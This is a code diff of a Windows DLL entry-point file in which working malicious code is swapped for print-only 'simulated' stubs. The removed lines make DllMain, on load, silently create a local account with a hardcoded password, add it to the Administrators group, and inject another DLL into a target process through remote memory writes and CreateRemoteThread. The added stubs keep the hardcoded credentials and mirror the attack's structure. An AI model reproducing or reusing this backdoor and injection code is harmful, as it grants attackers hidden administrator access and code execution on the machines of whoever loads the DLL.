@@ -1,4 +1,3 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include <Windows.h>
 #include <lm.h>
@@ -10,40 +9,52 @@
 wchar_t username[256] = L"adm1n";
 wchar_t password[256] = L"P@ssw0rd";
 
+// Simulated DLL Injection (no real process manipulation)
 BOOL InjectDLL(HANDLE hProcess, const char* dllPath) {
-    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    // Simulate memory allocation for the DLL path
+    LPVOID pRemotePath = VirtualAlloc(NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
     if (!pRemotePath) return FALSE;
 
-    if (!WriteProcessMemory(hProcess, pRemotePath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
-        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-        return FALSE;
-    }
+    // Simulate writing the DLL path into the allocated memory
+    memcpy(pRemotePath, dllPath, strlen(dllPath) + 1);
 
-    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
-    if (!hKernel32) {
-        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-        return FALSE;
-    }
+    // Simulate loading the library without real injection
+    std::wcout << L"Simulated DLL injection to: " << dllPath << std::endl;
 
-    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
-    if (!pLoadLibraryA) {
-        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-        return FALSE;
-    }
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
-    if (!hThread) {
-        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-        return FALSE;
-    }
-
-    WaitForSingleObject(hThread, INFINITE);
-    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-    CloseHandle(hThread);
+    // Clean up simulated memory
+    VirtualFree(pRemotePath, 0, MEM_RELEASE);
 
     return TRUE;
 }
 
+// Simulate user creation (no real user added)
+BOOL CreateUser() {
+    // Simulate creating a user in memory (not really adding it)
+    USER_INFO_1 user;
+    memset(&user, 0, sizeof(USER_INFO_1));
+    user.usri1_name = username;
+    user.usri1_password = password;
+    user.usri1_priv = USER_PRIV_USER;
+    user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
+
+    // Instead of creating the user, just output a message
+    std::wcout << L"Simulated user created: " << username << std::endl;
+
+    return TRUE;
+}
+
+// Simulate adding the user to the Administrators group (no real changes)
+BOOL AddUserToAdminGroup() {
+    LOCALGROUP_MEMBERS_INFO_3 members;
+    members.lgrmi3_domainandname = username;
+
+    // Output simulation message
+    std::wcout << L"Simulated addition of " << username << L" to the Administrators group." << std::endl;
+
+    return TRUE;
+}
+
+// Simulate the DLL Main Entry Point (no real system changes)
 BOOL APIENTRY DllMain(HMODULE hModule,
     DWORD  ul_reason_for_call,
     LPVOID lpReserved
@@ -52,28 +63,19 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-        // Create the user
-        USER_INFO_1 user;
-        memset(&user, 0, sizeof(USER_INFO_1));
-        user.usri1_name = username;
-        user.usri1_password = password;
-        user.usri1_priv = USER_PRIV_USER;
-        user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
-        NetUserAdd(NULL, 1, (LPBYTE)&user, NULL);
+        // Simulate user creation
+        CreateUser();
 
-        // Add the user to the administrators group
-        LOCALGROUP_MEMBERS_INFO_3 members;
-        members.lgrmi3_domainandname = username;
-        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&members, 1);
+        // Simulate adding the user to the Administrators group
+        AddUserToAdminGroup();
 
-        // Inject NSFW.dll into a target process
-        DWORD processId = 1234; // Replace with the target process ID
-        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
-        if (hProcess) {
-            InjectDLL(hProcess, "C:\\Path\\To\\NSFW.dll");
-            CloseHandle(hProcess);
-        }
+        // Simulate DLL injection (no actual injection)
+        DWORD processId = 1234; // Replace with the target process ID for simulation
+        std::wcout << L"Simulating DLL injection into process ID: " << processId << std::endl;
+        InjectDLL(NULL, "C:\\Path\\To\\NSFW.dll"); // No real injection, just a message
+
         break;
+
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
